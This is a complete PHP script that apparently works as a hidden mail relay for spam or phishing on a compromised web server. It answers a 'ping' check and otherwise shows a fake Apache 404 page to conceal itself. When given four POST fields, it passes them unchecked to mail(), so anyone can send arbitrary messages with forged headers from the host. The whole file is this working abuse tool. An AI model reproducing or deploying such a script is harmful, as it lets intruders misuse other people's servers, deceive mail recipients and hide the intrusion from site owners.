<?php
error_reporting(0);
if (isset($_GET["ping"]) and $_GET["ping"] == ("ping_host")) { 
echo "true"; 
}else{ 
$str = "<strong>Not Found</strong><br><br>The requested URL was not found on this server.<br>Apache / 2.2.22 (Linux) Server at Port 80";
if (isset($_POST["email_polucha"])) { $email_polucha = $_POST["email_polucha"]; }else{ exit("$str"); }
if (isset($_POST["tema_pisma"]))    { $tema_pisma    = $_POST["tema_pisma"];    }else{ exit("$str"); }
if (isset($_POST["telo_pisma"]))    { $telo_pisma    = $_POST["telo_pisma"];    }else{ exit("$str"); }
if (isset($_POST["headers"]))       { $headers       = $_POST["headers"];       }else{ exit("$str"); }

$return = mail($email_polucha,$tema_pisma,$telo_pisma,$headers);
if ($return == true) {
 echo "true";
}else{
 echo "false";
}

}

?>